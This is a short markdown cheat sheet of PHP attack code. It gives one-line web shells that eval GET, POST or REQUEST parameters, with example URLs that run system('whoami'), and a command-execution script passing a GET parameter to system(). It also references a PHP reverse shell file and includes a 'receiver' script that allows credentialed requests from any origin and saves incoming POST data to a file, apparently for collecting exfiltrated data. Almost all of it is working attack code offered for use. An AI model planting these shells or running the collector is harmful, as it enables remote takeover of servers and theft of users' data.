# php file

---
## web-shell

*x.php5*
```php
<?php @eval($_GET['x']);
```
*url command*
```bash
/x.php5?x=phpinfo();
```
```bash
/x.php5?x=system("whoami");
```
**others**

```php
<?php @eval($_POST['pass']);?>
```

```php
<?php @eval($_REQUEST['pass']);?>
```

---

## RCE

*rce.php*
```php
<?php 
    $cmd = $_GET['cmd'];
    system($cmd);
?>
```

---

## php-reverse-shell

::: details php-reverse-shell.php
<<< ./php/php-reverse-shell.php
:::

---

## receiver

`sudo apt install php apache2` go to `/var/www/html/`

This script captures the data from `php://input` and then saves the data in a text file. 

```php
<?php
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');

$postdata = file_get_contents("php://input");

file_put_contents('data.txt', $postdata);
?>
```